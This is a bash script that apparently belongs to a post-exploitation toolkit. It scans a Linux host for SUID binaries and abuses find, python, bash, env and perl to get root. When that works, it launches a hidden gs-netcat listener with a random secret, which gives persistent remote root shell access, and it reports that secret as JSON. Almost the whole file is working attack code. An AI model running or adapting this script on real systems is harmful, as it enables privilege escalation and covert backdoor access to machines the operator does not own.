#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="suid_binary"
info "Scanning SUID binaries..."
exploitable=("find" "vim" "vim.basic" "python" "python2" "python3" "perl" "ruby" "bash" "env" "awk" "nmap" "less" "cp")
while read -r bin; do
    name=$(basename "$bin")
    for exp in "${exploitable[@]}"; do
        [ "$name" != "$exp" ] && continue
        info "Testing SUID: $bin"
        case "$name" in
            find) "$bin" . -exec /bin/sh -p -c 'id' \; 2>/dev/null|grep -q "uid=0" && { secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); "$bin" . -exec /bin/sh -p -c "nohup gs-netcat -s '$secret' -l -i &>/dev/null &" \; 2>/dev/null; result_json "$METHOD" "success" "$bin" "$secret"; exit 0; };;
            python*) "$bin" -c 'import os;os.setuid(0);print("root")' 2>/dev/null|grep -q "root" && { secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); "$bin" -c "import os;os.setuid(0);os.system(\"nohup gs-netcat -s '$secret' -l -i &>/dev/null &\")"; result_json "$METHOD" "success" "$bin" "$secret"; exit 0; };;
            bash) "$bin" -p -c 'id' 2>/dev/null|grep -q "uid=0" && { secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); "$bin" -p -c "nohup gs-netcat -s '$secret' -l -i &>/dev/null &"; result_json "$METHOD" "success" "$bin" "$secret"; exit 0; };;
            env) "$bin" /bin/sh -p -c 'id' 2>/dev/null|grep -q "uid=0" && { result_json "$METHOD" "success" "$bin" ""; exit 0; };;
            perl) "$bin" -e 'exec "/bin/sh -p"' 2>/dev/null;;
        esac
    done
done < <(find / -perm -4000 -type f 2>/dev/null)
result_json "$METHOD" "fail" "No exploitable SUID"; exit 1
